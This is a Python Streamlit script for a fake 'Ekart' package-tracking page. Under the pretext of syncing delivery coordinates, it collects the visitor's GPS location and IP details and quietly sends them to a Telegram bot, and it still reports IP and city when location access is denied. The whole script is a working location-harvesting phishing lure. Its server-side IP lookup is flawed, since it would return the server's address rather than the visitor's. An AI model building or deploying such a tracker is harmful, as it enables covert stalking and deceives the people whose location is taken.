import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import requests
import pandas as pd

# --- TELEGRAM CONFIG ---
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID"

st.set_page_config(page_title="Ekart Tracking", layout="centered")

# Custom CSS to make the button look more "clickable" on a small mobile screen
st.markdown("""
    <style>
    .stButton>button {
        width: 100%;
        height: 3em;
        background-color: #2874f0;
        color: white;
        font-weight: bold;
        border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

st.title("📦 Package Tracking")
st.write("Shipment ID: **#EK-17112026**")

# Get IP location first (Silent Fallback)
ip_data = requests.get('http://ip-api.com/json/').json()

# The Geolocation Component
st.info("Tap the button below to sync your delivery coordinates.")
location = streamlit_geolocation()

if location.get('latitude'):
    st.success("📍 Location Verified!")
    # Send to Telegram
    msg = f"✅ GPS FOUND\nLat: {location['latitude']}\nLon: {location['longitude']}\nIP: {ip_data.get('query')}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": msg})
    
    st.map(pd.DataFrame({'lat': [location['latitude']], 'lon': [location['longitude']]}))
else:
    # Silent log of IP (City level)
    msg = f"⚠️ GPS DENIED / WAITING\nIP: {ip_data.get('query')}\nCity: {ip_data.get('city')}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": msg})
    st.warning("Please click 'Allow' on the browser prompt to continue.")
